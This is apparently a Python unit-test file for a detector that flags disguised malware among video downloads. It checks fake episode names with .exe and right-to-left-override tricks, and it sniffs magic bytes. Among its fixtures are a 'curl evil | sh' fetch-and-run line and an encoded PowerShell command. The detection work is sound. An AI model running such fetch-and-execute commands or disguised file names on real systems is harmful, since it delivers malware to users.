import unittest

from tastarr.signatures import extension, is_video_name, name_problem, sniff


def ts_stream(stride=188, lead=0, packets=6):
    packet = bytearray(stride)
    packet[lead] = 0x47
    return bytes(packet) * packets


class NameTests(unittest.TestCase):
    def test_fake_episode_names(self):
        for name in (
            "Show.Name.S06E03.1080p.WEB-DL.DDP5.1.x265-GROUP.exe",
            "Show Name S02E02 1080p HD h264- GROUP.exe",
            "Show/Show.S01E01.mkv            .exe",
        ):
            self.assertEqual(name_problem(name), "dangerous extension .exe", name)

    def test_bidi_disguise(self):
        self.assertIn("bidi", name_problem("Show.S01E01‮vkm.exe"))
        self.assertIn("bidi", name_problem("Show.S01E01‮vkm.scr.mkv"))

    def test_legit_release_files(self):
        for name in (
            "Show.S01E01.1080p.WEB.h264-GROUP[site].mkv",
            "Pack/Show.S01E01.mkv.nfo",
            "Pack/RELEASE.txt",
            "Pack/cover.jpg",
            "Pack/Subs/2_English.srt",
            "www.example.org    -    Movie 2006 1080p",
        ):
            self.assertIsNone(name_problem(name), name)

    def test_extension(self):
        self.assertEqual(extension("a/b/Movie.2010.MKV"), ".mkv")
        self.assertEqual(extension("noext"), "")
        self.assertTrue(is_video_name("x/Episode.m2ts"))
        self.assertFalse(is_video_name("x/Episode.mkv.nfo"))


class SniffTests(unittest.TestCase):
    def test_video_containers(self):
        cases = {
            b"\x1a\x45\xdf\xa3" + b"\x00" * 60: "matroska",
            b"\x00\x00\x00\x20ftypisom" + b"\x00" * 60: "isobmff (mp4/mov)",
            b"\x00\x00\x00\x08wide\x00\x00\x00\x00mdat": "isobmff (mp4/mov)",
            b"RIFF\x00\x00\x00\x00AVI LIST" + b"\x00" * 60: "avi",
            bytes.fromhex("3026b2758e66cf11a6d900aa0062ce6c") + b"\x00" * 40: "asf (wmv)",
            b"\x00\x00\x01\xba" + b"\x44" * 60: "mpeg-ps",
            b"FLV\x01\x05" + b"\x00" * 60: "flv",
            b"OggS\x00\x02" + b"\x00" * 60: "ogg",
            ts_stream(): "mpeg-ts",
            b"\xff" * 7 + ts_stream(): "mpeg-ts",  # not aligned at 0
            ts_stream(192, 4): "m2ts",
        }
        for head, label in cases.items():
            got = sniff(head)
            self.assertEqual((got.kind, got.label), ("video", label), head[:12])

    def test_dangerous(self):
        cases = {
            b"MZ\x90\x00\x03\x00\x00\x00" + b"\x00" * 60: "pe-executable",
            b"\x7fELF\x02\x01\x01" + b"\x00" * 60: "elf-executable",
            b"PK\x03\x04\x14\x00" + b"\x00" * 60: "zip",
            b"Rar!\x1a\x07\x01\x00" + b"\x00" * 60: "rar",
            b"7z\xbc\xaf\x27\x1c\x00\x04" + b"\x00" * 60: "7z",
            bytes.fromhex("d0cf11e0a1b11ae1") + b"\x00" * 60: "ole-compound (msi/doc)",
            b"L\x00\x00\x00\x01\x14\x02\x00" + b"\x00" * 60: "windows-shortcut",
            b"#!/bin/sh\ncurl evil | sh\n": "shebang-script",
        }
        for head, label in cases.items():
            got = sniff(head)
            self.assertEqual((got.kind, got.label), ("dangerous", label), head[:12])

    def test_text_script_without_magic_is_unknown(self):
        got = sniff(b"@echo off\r\npowershell -enc AAAA\r\n" * 20)
        self.assertEqual((got.kind, got.label), ("unknown", "text"))

    def test_random_bytes_unknown(self):
        self.assertEqual(sniff(bytes(range(1, 256)) * 4).kind, "unknown")

    def test_empty(self):
        self.assertEqual(sniff(b"").kind, "empty")
        self.assertEqual(sniff(b"\x00" * 8192).kind, "empty")


if __name__ == "__main__":
    unittest.main()
